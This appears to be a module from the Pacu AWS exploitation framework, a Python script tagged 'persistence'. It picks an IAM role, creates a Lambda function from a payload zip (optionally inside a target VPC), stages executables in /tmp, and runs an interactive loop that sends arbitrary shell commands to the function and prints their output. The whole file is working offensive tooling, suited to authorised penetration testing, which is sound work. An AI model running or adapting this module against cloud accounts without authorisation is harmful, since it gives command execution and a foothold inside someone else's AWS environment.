#!/usr/bin/env python3
import argparse
import json
from pathlib import Path

from botocore.exceptions import ClientError

module_info = {
    'name': 'lambda_executor',
    'author': 'Alexander Morgenstern',
    'category': 'persistence',
    'one_liner': 'Creates a Lambda function that allows you to run arbitrary system commands',
    'description': 'This module creates a lambda function that sends system commands to a specified Lambda container that can send and receive output. The default payload is colocated with the module code, otherwise the payload location can be specified. Lambda Functions can be created within VPCs by passing in a VPC Id and the associated subnets and security groups will be prompted to be added to the configuration.',
    'services': ['Lambda'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--vpc', '--code', '--region'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--region', required=True, help='Region to launch Lambda function')
parser.add_argument('--vpc', help='VPCId to target when staging the Lambda function')
parser.add_argument(
    '--code',
    default='modules/lambda_executor/payload.zip',
    help='Zip file that contains the source code of the Lambda function')

FUNC_NAME = 'function_executor'

def get_code(zip_file):
    """Returns a byte stream of a payload zip file
    Args:
        zip_file (str): Path to zip_file
    Returns:
        bytes: Returns byte stream of zip_file if found, otherwise an empty string
    """
    path = Path(zip_file)
    if not path.exists():
        return ''
    with open(r'{}'.format(zip_file), 'rb') as code_file:
        out = code_file.read()
    return out

def get_role(pacu):
    """Returns an execution Role ARN
    Args:
        pacu (Main): Instance of Pacu
    Returns:
        str: Returns a valid ARN or an empty String if not found
    """
    pacu.print('  Enter Role ARN manually or press Enter to continue...')
    response = pacu.input('    Role ARN : ')
    if response:
        return response
    if not pacu.fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True):
        return ''
    session = pacu.get_active_session()
    roles = session.IAM['Roles']
    pacu.print('  Select Lambda Execution Role: ')
    for role in roles:
        if pacu.input('    {} (y/n)? '.format(role['RoleName'])) == 'y':
            return role['Arn']
    return ''

def get_vpc_config(pacu, vpc, region):
    """Returns a valid vpc Config to use with staging a Lambda function
    Args:
        pacu (Main): Instance of Pacu
        vpc (str): VPCId to compare found subnets and security groups against
        region (str): Region where the VPC resides
    Returns:
        str: Returns a valid ARN or an empty String if not found
    """
    config = {'SubnetIds': [], 'SecurityGroupIds':[]}
    fields = ['EC2', 'SecurityGroups', 'Subnets']
    args = '--regions {} --security-groups --subnets'.format(region)
    if not pacu.fetch_data(fields, 'enum_ec2', args):
        return {}
    session = pacu.get_active_session()
    pacu.print('  Finding Subnets to add to VPC Config...')
    for subnet in session.EC2['Subnets']:
        if subnet['VpcId'] == vpc:
            if pacu.input('    {}? (y/n) '.format(subnet['CidrBlock'])) == 'y':
                config['SubnetIds'].append(subnet['SubnetId'])
    pacu.print('  Finding Security Groups to add to VPC Config...')
    for sec_group in session.EC2['SecurityGroups']:
        if sec_group['VpcId'] == vpc:
            if pacu.input('    {}? (y/n) '.format(sec_group['GroupName'])) == 'y':
                config['SecurityGroupIds'].append(sec_group['GroupId'])
    if not config['SubnetIds'] or not config['SecurityGroupIds']:
        return {}
    return config


def send_command(client, command):
    """Sends a command to the staged lambda function
    Args:
        client (boto3.client): Client to invoke lambda function
        command (str): Command string to invoke function with
    Returns:
        str: Returns a response or an error code if there was a failure
    """
    try:
        return client.invoke(
            FunctionName=FUNC_NAME,
            Payload=json.JSONEncoder().encode({"command":command})
        )
    except ClientError as error:
        return error.response['Error']['Code']


def main(args, pacu):
    args = parser.parse_args(args)
    pacu.print('Starting module')

    client = pacu.get_boto3_client('lambda', args.region)

    init_func_kwargs = {
        'FunctionName':FUNC_NAME,
        'Runtime':'python3.6',
        'Timeout':300,
        'Handler': 'lambda_func.lambda_handler',
        'Code': {'ZipFile': get_code(args.code)},
        'Role': get_role(pacu),
    }

    if not init_func_kwargs['Role']:
        return {'fail':'Unable to get Lambda Execution Role'}

    if args.vpc:
        init_func_kwargs['VpcConfig'] = get_vpc_config(pacu, args.vpc, args.region)
        if not init_func_kwargs['VpcConfig']:
            return {'fail':'Unable to get VPC configuration'}

    pacu.print('  Attempting to Create Function...')
    try:
        client.create_function(**init_func_kwargs)
    except ClientError as error:
        pacu.print(error.response['Error']['Message'])
        return {'fail': 'Unable to create Lambda function'}

    pacu.print('  Function Creation Successful')
    pacu.print('  Initialzing Payload to /tmp...')
    send_command(client, 'cp -r exec /tmp')
    send_command(client, 'chmod -R a+x /tmp')

    while True:
        command = pacu.input('  Enter Command: ')
        if command == 'exit':
            break
        response = send_command(client, command)
        decoded = response['Payload'].read().decode()
        decoded_json = json.JSONDecoder().decode(decoded)
        if 'body' in decoded_json:
            pacu.print('OUTPUT RETURNED:\n{}'.format(decoded_json['body']))
        else:
            pacu.print('  Unexpected response format')

    try:
        client.delete_function(FunctionName=FUNC_NAME)
    except ClientError:
        return {'fail': 'Unable to delete Lambda Function'}
    return {'success': 'Lambda Function Execution Successful'}


def summary(data, pacu_main):
    if 'fail' in data:
        out = data['fail']
    elif 'success' in data:
        out = data['success']
    return '  ' + out
